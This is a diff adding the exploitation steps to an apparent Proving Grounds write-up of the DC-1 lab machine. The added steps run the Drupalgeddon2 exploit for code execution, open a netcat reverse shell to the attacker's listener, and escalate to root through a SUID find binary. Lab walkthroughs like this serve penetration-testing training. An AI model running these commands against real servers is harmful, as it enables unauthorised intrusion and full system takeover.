@@ -190,4 +190,107 @@ Shellcodes: No Results
 
 ```
 
-`` Searchsploit output indicated that drupal Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 is vulnerable to Remote Code Execution, Another name for this vulnerability isDrupalgeddon2 
+`` Searchsploit output indicated that drupal Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 is vulnerable to Remote Code Execution, Another name for this vulnerability is Drupalgeddon2 ``
+
+```python
+Found the exploit here you can refer:https://github.com/lorddemon/drupalgeddon2
+1.Download the exploit and change its permission to execute
+```
+
+## Running the exploit
+```javascript
+┌──(dx㉿kali)-[~/Desktop/Proving-ground]
+└─$ python2 drupalgeddon2.py -h  http://192.168.103.193/ -c id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+```
+`` with this exploit we get reverse shell ``
+```javascript
+                                                                                                                                                 
+┌──(dx㉿kali)-[~/Desktop/Proving-ground]
+└─$ python2 drupalgeddon2.py -h  http://192.168.103.193/ -c ' nc -e /bin/sh 192.168.49.103 8080 '
+
+```
+```javacript
+┌──(dx㉿kali)-[~]
+└─$ nc -lvp 8080
+listening on [any] 8080 ...
+192.168.103.193: inverse host lookup failed: Unknown host
+connect to [192.168.49.103] from (UNKNOWN) [192.168.103.193] 53506
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+which python
+/usr/bin/python
+python -c 'import pty; pty.spawn("/bin/bash")'
+www-data@DC-1:/var/www$ 
+
+
+```
+
+## Escalating Priviledges
+`` Checking the Local Enumeration for SUID bit set``
+```javascript
+www-data@DC-1:/$ find / -type f -perm -u=s 2>/dev/null
+find / -type f -perm -u=s 2>/dev/null                 
+/bin/mount                                            
+/bin/ping                                             
+/bin/su                                               
+/bin/ping6                                            
+/bin/umount                                           
+/usr/bin/at                                           
+/usr/bin/chsh                                         
+/usr/bin/passwd                                             
+/usr/bin/newgrp                                             
+/usr/bin/chfn                                               
+/usr/bin/gpasswd                                            
+/usr/bin/procmail                                           
+/usr/bin/find
+/usr/sbin/exim4
+/usr/lib/pt_chown
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/sbin/mount.nfs
+
+```
+`` Reference https://gtfobins.github.io/gtfobins/find/#suid ``
+
+```python
+/usr/bin/find . -exec /bin/sh \; -quit
+```
+##### Root
+
+```javascript
+www-data@DC-1:/$ cd /tmp
+cd /tmp
+www-data@DC-1:/tmp$ /usr/bin/find . -exec /bin/sh \; -quit
+/usr/bin/find . -exec /bin/sh \; -quit
+# id
+id
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
+# whoami
+whoami
+root
+# 
+cd /root
+# pwd
+pwd
+/root
+# ls -la
+ls -la
+total 36
+drwx------  4 root root 4096 Sep 12 14:17 .
+drwxr-xr-x 23 root root 4096 Feb 19  2019 ..
+drwx------  2 root root 4096 Mar 29 22:56 .aptitude
+-rw-------  1 root root    6 Mar 30 00:31 .bash_history
+-rw-r--r--  1 root root  949 Feb 19  2019 .bashrc
+drwxr-xr-x  3 root root 4096 Feb 19  2019 .drush
+-rw-r--r--  1 root root  140 Nov 20  2007 .profile
+-rw-r--r--  1 root root   33 Sep 12 14:17 proof.txt
+-rw-r--r--  1 root root  173 Feb 19  2019 thefinalflag.txt
+# cat proof.txt
+cat proof.txt
+
+```
+
